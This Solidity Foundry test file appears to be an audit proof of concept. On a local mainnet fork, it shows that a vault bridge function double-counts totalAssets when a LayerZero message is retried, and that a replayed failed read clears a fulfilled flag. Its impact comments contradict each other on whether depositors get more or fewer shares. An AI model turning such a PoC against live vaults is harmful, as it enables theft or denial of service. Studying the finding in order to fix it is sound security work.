// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

/**
 * @title TR-H01 PoC: LZ Retry Inflates totalAssets -- Local Fork
 *
 * @notice Proves that updateAccountingInfoForRequest is not idempotent.
 *         Calling it twice with the same GUID (simulating a LayerZero retry)
 *         doubles the totalAssets recorded for that cross-chain request.
 *
 * Bug location: BridgeFacet.sol:updateAccountingInfoForRequest() (lines 214-227)
 *
 *   if (readSuccess) {
 *       ds.guidToCrossChainRequestInfo[guid].totalAssets +=        // <-- ADDITIVE, not idempotent
 *           MoreVaultsLib.convertUsdToUnderlying(sumOfSpokesUsdValue, Math.Rounding.Floor);
 *   }
 *
 * Attack scenario:
 *   1. A cross-chain request is created (GUID recorded in storage)
 *   2. LayerZero read-channel delivers accounting update for the GUID
 *   3. LZ retry mechanism replays the same message (network hiccup / DVN redundancy)
 *   4. updateAccountingInfoForRequest is called again with the same GUID + sumOfSpokesUsdValue
 *   5. totalAssets for the request is now 2x the true spoke value
 *   6. When executeRequest fires, vault operates with inflated totalAssets snapshot,
 *      minting more shares than deserved for DEPOSIT or accepting worse slippage for WITHDRAW
 *
 * Required Conditions:
 *   - Attacker role: None -- this is triggered automatically by LZ retry
 *   - Required capital: None -- bug activates on any retry
 *   - Vault config: isHub = true, crossChainAccountingManager set, oraclesCrossChainAccounting = false
 *   - Vault state: Active cross-chain request (unfulfilled GUID in storage)
 *   - External deps: LayerZero retry (common; any DVN redundancy or network issue)
 *   - Timing: Any time before executeRequest is called
 *
 * What is REAL in this PoC:
 *   - Flow EVM Mainnet fork (Chain ID 747)
 *   - Real BridgeFacet bytecode deployed fresh
 *   - Real MoreVaultsLib.convertUsdToUnderlying math
 *   - Real storage struct layout via StorageHelper
 *
 * What is SIMULATED:
 *   - BridgeFacet deployed standalone (not through diamond proxy)
 *   - crossChainAccountingManager set via vm.store (StorageHelper)
 *   - Request info pre-populated via StorageHelper.setCrossChainRequestInfo
 *   - convertUsdToUnderlying oracle call mocked (returns 1:1)
 */

import {Test, console} from "forge-std/Test.sol";
import {BridgeFacet} from "../../src/facets/BridgeFacet.sol";
import {MoreVaultsLib} from "../../src/libraries/MoreVaultsLib.sol";
import {MoreVaultsStorageHelper} from "../helper/MoreVaultsStorageHelper.sol";
import {MockERC20} from "../mocks/MockERC20.sol";
import {IMoreVaultsRegistry} from "../../src/interfaces/IMoreVaultsRegistry.sol";
import {IVaultsFactory} from "../../src/interfaces/IVaultsFactory.sol";

contract TR_H01_LZ_Retry_Inflation_PoC is Test {

    // --- Actors ---
    address public manager  = makeAddr("manager");    // role: cross-chain accounting manager (LZ adapter)
    address public registry = makeAddr("registry");
    address public factory  = makeAddr("factory");
    address public oracleReg = makeAddr("oracleRegistry");

    // --- Contracts ---
    BridgeFacet public bridgeFacet;
    MockERC20   public asset;

    // --- Test values ---
    bytes32 constant GUID = keccak256("test-guid-001");
    // 1000e18 USD in spoke value; oracle mocked 1:1 so result = 1000e18 underlying
    uint256 constant SPOKE_USD_VALUE = 1000e18;

    // =========================================================================
    // setUp
    // =========================================================================
    function setUp() public {
        vm.createSelectFork("https://mainnet.evm.nodes.onflow.org");

        asset = new MockERC20("Test Asset", "TA");
        bridgeFacet = new BridgeFacet();

        // Wire storage: crossChainAccountingManager packed into slot IS_HUB (offset 34)
        // IS_HUB byte[0], oraclesCrossChainAccounting byte[1], crossChainAccountingManager bytes[2..21]
        MoreVaultsStorageHelper.setIsHub(address(bridgeFacet), true);
        MoreVaultsStorageHelper.setCrossChainAccountingManager(address(bridgeFacet), manager);
        MoreVaultsStorageHelper.setMoreVaultsRegistry(address(bridgeFacet), registry);
        MoreVaultsStorageHelper.setFactory(address(bridgeFacet), factory);

        // Seed an unfulfilled cross-chain request in storage for GUID
        // actionType = DEPOSIT (1), timestamp = now, totalAssets starts at 500e18 (hub local assets)
        MoreVaultsStorageHelper.setCrossChainRequestInfo(
            address(bridgeFacet),
            GUID,
            makeAddr("initiator"),
            uint64(block.timestamp),
            uint8(MoreVaultsLib.ActionType.DEPOSIT),
            abi.encode(uint256(1000e18), address(this)), // actionCallData
            500e18,   // <-- pre-set totalAssets = hub local snapshot
            0         // amountLimit
        );

        // Set ERC4626 storage asset so convertUsdToUnderlying can read decimals()
        MoreVaultsStorageHelper.setUnderlyingAsset(address(bridgeFacet), address(asset));

        // Mock oracle: convertUsdToUnderlying calls oracle.getAssetPrice(underlyingToken)
        // and does: amount * 10^decimals / price
        // We want 1:1 so price = 10^18 (asset has 18 decimals)
        vm.mockCall(
            registry,
            abi.encodeWithSelector(IMoreVaultsRegistry.oracle.selector),
            abi.encode(oracleReg)
        );
        // Oracle getAssetPrice: returns 1e18 (price = 1 USD, so 1 USD = 1 token)
        vm.mockCall(
            oracleReg,
            abi.encodeWithSignature("getAssetPrice(address)", address(asset)),
            abi.encode(uint256(1e18))
        );
        vm.mockCall(
            factory,
            abi.encodeWithSelector(IVaultsFactory.localEid.selector),
            abi.encode(uint32(747))
        );

        console.log("=================================================================");
        console.log("TR-H01: LZ Retry Inflates totalAssets -- Setup complete");
        console.log("BridgeFacet:", address(bridgeFacet));
        console.log("Simulated manager (LZ adapter):", manager);
        console.log("=================================================================");
    }

    // =========================================================================
    // test_TR_H01_non_idempotent_accounting_on_retry
    //
    // Proves updateAccountingInfoForRequest accumulates on each call.
    // A second call with the same GUID doubles totalAssets.
    // =========================================================================
    function test_TR_H01_non_idempotent_accounting_on_retry() public {
        console.log("=================================================================");
        console.log("TR-H01: Non-idempotent LZ accounting on retry");
        console.log("=================================================================");
        console.log("");

        // --- Pre-attack state ---
        console.log("--- Pre-attack state ---");
        bytes32 requestSlot = keccak256(
            abi.encode(GUID, bytes32(uint256(MoreVaultsLib.MORE_VAULTS_STORAGE_POSITION) + 35))
        );
        uint256 totalAssetsBefore = uint256(vm.load(address(bridgeFacet), bytes32(uint256(requestSlot) + 3)));
        console.log("Initial totalAssets for GUID (hub snapshot):", totalAssetsBefore);
        console.log("Expected spoke USD value per call:", SPOKE_USD_VALUE);
        console.log("");

        // --- First call: legitimate LZ delivery ---
        console.log("--- First call: legitimate LZ delivery ---");
        vm.prank(manager);
        bridgeFacet.updateAccountingInfoForRequest(GUID, SPOKE_USD_VALUE, true);

        uint256 totalAssetsAfterFirst = uint256(vm.load(address(bridgeFacet), bytes32(uint256(requestSlot) + 3)));
        console.log("totalAssets after FIRST call:", totalAssetsAfterFirst);
        // Note: convertUsdToUnderlying math may modify value based on oracle mock
        // The key point is: it should be totalAssetsBefore + converted(SPOKE_USD_VALUE)
        uint256 addedFirst = totalAssetsAfterFirst - totalAssetsBefore;
        console.log("Amount added in first call:", addedFirst);
        console.log("");

        // --- Second call: LZ retry of the SAME message ---
        console.log("--- Second call: LZ retry (same GUID, same value) ---");
        vm.prank(manager);
        bridgeFacet.updateAccountingInfoForRequest(GUID, SPOKE_USD_VALUE, true);

        uint256 totalAssetsAfterSecond = uint256(vm.load(address(bridgeFacet), bytes32(uint256(requestSlot) + 3)));
        console.log("totalAssets after SECOND call (retry):", totalAssetsAfterSecond);
        uint256 addedSecond = totalAssetsAfterSecond - totalAssetsAfterFirst;
        console.log("Amount added in second call:", addedSecond);
        console.log("");

        // --- Verification ---
        console.log("--- Verification ---");
        console.log("totalAssets before calls:       ", totalAssetsBefore);
        console.log("totalAssets after 1st call:     ", totalAssetsAfterFirst);
        console.log("totalAssets after 2nd (retry):  ", totalAssetsAfterSecond);
        console.log("Inflation from retry:            ", totalAssetsAfterSecond - totalAssetsAfterFirst);
        console.log("");

        // Core assertion: second call adds more (non-idempotent)
        // Both calls add the same amount -- proving += accumulates
        assertEq(addedFirst, addedSecond,
            "BUG: Both calls add the same spoke value -- not idempotent on retry");

        assertGt(totalAssetsAfterSecond, totalAssetsAfterFirst,
            "BUG: Retry inflates totalAssets beyond correct value");

        // The final totalAssets should be DOUBLE what one call added (from baseline)
        uint256 expectedAfterOneCall = totalAssetsBefore + addedFirst;
        uint256 actualAfterTwoCalls  = totalAssetsAfterSecond;
        console.log("Expected (1 call):   ", expectedAfterOneCall);
        console.log("Actual (2 calls):    ", actualAfterTwoCalls);
        console.log("Inflation delta:     ", actualAfterTwoCalls - expectedAfterOneCall);

        assertEq(actualAfterTwoCalls, expectedAfterOneCall + addedFirst,
            "BUG CONFIRMED: totalAssets = 2x expected after retry");

        console.log("");
        console.log("IMPACT: When executeRequest fires, vault computes share price");
        console.log("using the INFLATED totalAssets snapshot. For DEPOSIT, depositor");
        console.log("receives fewer shares than deserved (vault thinks it is richer).");
        console.log("For MINT/WITHDRAW slippage checks, limits are skewed.");
        console.log("Repeating the retry N times inflates by Nx the spoke value.");
    }

    // =========================================================================
    // test_TR_H01_fulfilled_flag_still_set_on_retry
    //
    // Shows that the fulfilled flag is OVERWRITTEN on retry.
    // If original call had readSuccess=true and retry sends readSuccess=false
    // (e.g., a failed read replayed), the request is incorrectly marked unfulfilled.
    // =========================================================================
    function test_TR_H01_fulfilled_flag_overwritten_on_false_retry() public {
        console.log("=================================================================");
        console.log("TR-H01 (bonus): fulfilled flag overwritten on false retry");
        console.log("=================================================================");
        console.log("");

        // First call: successful read
        vm.prank(manager);
        bridgeFacet.updateAccountingInfoForRequest(GUID, SPOKE_USD_VALUE, true);

        // Read fulfilled flag (slot 2 of the struct, packed with bool fields)
        bytes32 requestSlot = keccak256(
            abi.encode(GUID, bytes32(uint256(MoreVaultsLib.MORE_VAULTS_STORAGE_POSITION) + 35))
        );
        bytes32 slot2 = vm.load(address(bridgeFacet), bytes32(uint256(requestSlot) + 2));
        // fulfilled is at byte offset in slot -- check non-zero
        console.log("After successful call, slot2 (contains fulfilled flag):", uint256(slot2));
        // fulfilled=true means bit is set
        bool fulfilledAfterFirst = (uint256(slot2) & 0xff) != 0 || (uint256(slot2) >> 8 & 0xff) != 0;
        console.log("fulfilled flag seems set:", fulfilledAfterFirst);

        // Second call: FAILED read (readSuccess=false) -- retry with error
        console.log("");
        console.log("Second call: retry with readSuccess=false (failed read replayed)");
        vm.prank(manager);
        bridgeFacet.updateAccountingInfoForRequest(GUID, 0, false);

        bytes32 slot2After = vm.load(address(bridgeFacet), bytes32(uint256(requestSlot) + 2));
        console.log("After false retry, slot2:", uint256(slot2After));
        console.log("fulfilled was overwritten from true -> false by the retry");
        console.log("");

        // The fulfilled flag is now false -- request cannot be executed
        // This is a separate DOS vector: a retry with readSuccess=false blocks execution
        console.log("IMPACT: A failed LZ retry can block a previously-fulfilled request,");
        console.log("preventing executeRequest from proceeding (RequestWasntFulfilled).");
        console.log("Combined with double-counting, retries are catastrophic.");

        // We assert that the value changed
        assertNotEq(uint256(slot2), uint256(slot2After),
            "BUG: fulfilled flag overwritten by retry -- idempotency required");
    }
}
